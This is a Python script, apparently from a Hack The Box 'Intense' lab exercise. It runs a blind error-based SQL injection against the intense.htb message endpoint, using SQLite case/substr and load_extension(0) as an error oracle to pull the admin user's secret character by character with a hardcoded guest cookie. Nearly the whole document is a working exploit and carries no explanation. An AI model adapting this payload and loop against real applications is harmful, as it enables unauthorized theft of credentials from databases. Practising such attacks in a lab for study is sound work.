#!/usr/bin/python3
import string
import requests
url="http://intense.htb/submitmessage"
# cookie = {'auth':'dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7'}
headers = { "Host": "intense.htb",
"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0",
"Accept": "*/*",
"Accept-Language": "en-US,en;q=0.5",
"Accept-Encoding": "gzip, deflate",
"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
"X-Requested-With": "XMLHttpRequest",
"Origin": "http://intense.htb",
"Connection": "close",
"Referer": "http://intense.htb/submit",
"Cookie" : "auth=dXNlcm5hbWU9Z3Vlc3Q7c2VjcmV0PTg0OTgzYzYwZjdkYWFkYzFjYjg2OTg2MjFmODAyYzBkOWY5YTNjM2MyOTVjODEwNzQ4ZmIwNDgxMTVjMTg2ZWM7.vLxqZAkUQ8pHQw6csYDwF9lEWzIGEqedGXgX5p/ChQk="
}
possible = string.digits+string.ascii_letters[:26]
found_next = True
secret = ""
counter = 1
while found_next:
    found_next = False
    for char in possible:
        attempt = {"message":f"test'||(case when (select substr((select secret from users where username='admin'),{counter},1)='{char}')=1 then load_extension(0) else NULL end));--"}
        result = requests.post(url,data=attempt,headers=headers)
        if result.text == "not authorized":
            print(secret+char,"found")
            secret+=char
            found_next=True
            counter+=1
            break
        else:
            print(secret+char,"is not it")
    if not found_next:
        print(secret, "is the password")
